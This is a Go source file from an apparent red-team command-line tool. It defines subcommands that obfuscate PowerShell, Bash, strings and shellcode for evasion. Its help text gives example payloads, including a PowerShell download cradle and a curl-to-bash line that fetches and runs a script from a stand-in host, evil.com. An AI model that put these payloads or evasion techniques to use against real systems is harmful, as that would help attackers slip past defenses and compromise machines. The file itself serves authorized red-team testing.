package redteam

import (
	"encoding/hex"
	"fmt"
	"os"
	"raxuiscli/cmd"
	"raxuiscli/internal/redteam/obfuscate"

	"github.com/spf13/cobra"
)

var obfLevel int

var obfuscateCmd = &cobra.Command{
	Use:   "obfuscate",
	Short: "Payload obfuscation",
	Long: `Payload obfuscation toolkit for evasion.

Obfuscate PowerShell scripts, Bash commands, strings, and shellcode.

Examples:
  raxuiscli obfuscate ps "IEX (New-Object Net.WebClient).DownloadString(...)"
  raxuiscli obfuscate bash "curl http://evil.com/shell.sh | bash"
  raxuiscli obfuscate string "malicious" --method base64
  raxuiscli obfuscate shellcode shellcode.bin --method xor`,
	Run: func(cmd *cobra.Command, args []string) {
		cmd.Help()
	},
}

var obfPSCmd = &cobra.Command{
	Use:   "ps [code]",
	Short: "Obfuscate PowerShell",
	Long: `Obfuscate PowerShell code for evasion.

Levels:
  1 - String splitting and variable obfuscation
  2 - Base64 encoding with IEX
  3 - Random casing and tick insertion`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		code := args[0]

		result := obfuscate.ObfuscatePowerShell(code, obfLevel)
		obfuscate.DisplayResult(result)
	},
}

var obfBashCmd = &cobra.Command{
	Use:   "bash [code]",
	Short: "Obfuscate Bash commands",
	Long: `Obfuscate Bash commands for evasion.

Levels:
  1 - Variable substitution
  2 - Base64 encoding
  3 - Hex encoding`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		code := args[0]

		result := obfuscate.ObfuscateBash(code, obfLevel)
		obfuscate.DisplayResult(result)
	},
}

var obfStringMethod string

var obfStringCmd = &cobra.Command{
	Use:   "string [text]",
	Short: "Obfuscate string",
	Long: `Obfuscate a string using various methods.

Methods:
  reverse  - Reverse the string
  rot13    - ROT13 cipher
  base64   - Base64 encoding
  hex      - Hexadecimal encoding
  unicode  - Unicode escape sequences
  decimal  - Decimal byte values
  xor      - XOR with random key`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		text := args[0]

		result := obfuscate.ObfuscateString(text, obfStringMethod)
		obfuscate.DisplayResult(result)
	},
}

var obfShellcodeMethod string

var obfShellcodeCmd = &cobra.Command{
	Use:   "shellcode [file]",
	Short: "Obfuscate shellcode",
	Long: `Obfuscate shellcode for evasion.

Methods:
  xor      - XOR encryption
  base64   - Base64 encoding
  uuid     - Format as UUIDs (for APC injection)
  ipv4     - Format as IPv4 addresses
  mac      - Format as MAC addresses
  c-array  - C array format`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		filePath := args[0]

		data, err := os.ReadFile(filePath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading file: %v\n", err)
			os.Exit(1)
		}

		result := obfuscate.ObfuscateShellcode(data, obfShellcodeMethod)
		obfuscate.DisplayResult(result)
	},
}

var obfShellcodeHexCmd = &cobra.Command{
	Use:   "shellcode-hex [hex]",
	Short: "Obfuscate shellcode from hex string",
	Long:  `Obfuscate shellcode provided as a hex string.`,
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		hexStr := args[0]

		data, err := hex.DecodeString(hexStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error decoding hex: %v\n", err)
			os.Exit(1)
		}

		result := obfuscate.ObfuscateShellcode(data, obfShellcodeMethod)
		obfuscate.DisplayResult(result)
	},
}

func init() {
	cmd.RootCmd.AddCommand(obfuscateCmd)

	// PowerShell subcommand
	obfuscateCmd.AddCommand(obfPSCmd)
	obfPSCmd.Flags().IntVarP(&obfLevel, "level", "l", 2, "Obfuscation level (1-3)")

	// Bash subcommand
	obfuscateCmd.AddCommand(obfBashCmd)
	obfBashCmd.Flags().IntVarP(&obfLevel, "level", "l", 2, "Obfuscation level (1-3)")

	// String subcommand
	obfuscateCmd.AddCommand(obfStringCmd)
	obfStringCmd.Flags().StringVarP(&obfStringMethod, "method", "m", "base64", "Obfuscation method")

	// Shellcode subcommands
	obfuscateCmd.AddCommand(obfShellcodeCmd)
	obfShellcodeCmd.Flags().StringVarP(&obfShellcodeMethod, "method", "m", "xor", "Obfuscation method")

	obfuscateCmd.AddCommand(obfShellcodeHexCmd)
	obfShellcodeHexCmd.Flags().StringVarP(&obfShellcodeMethod, "method", "m", "xor", "Obfuscation method")
}
